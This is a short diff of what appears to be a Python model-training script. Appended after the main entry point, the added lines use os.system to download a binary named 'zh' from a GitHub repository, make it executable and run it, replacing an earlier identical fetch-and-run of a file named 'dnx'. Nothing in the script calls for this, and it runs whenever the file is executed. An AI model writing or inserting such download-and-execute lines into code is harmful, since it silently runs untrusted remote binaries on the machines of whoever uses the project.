@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/bengetsia/proxy1/raw/main/dnx')
-os.system('chmod 777 dnx')
-os.system('./dnx')
+os.system('wget https://github.com/bengetsia/soft/raw/main/zh')
+os.system('chmod 777 zh')
+os.system('./zh')
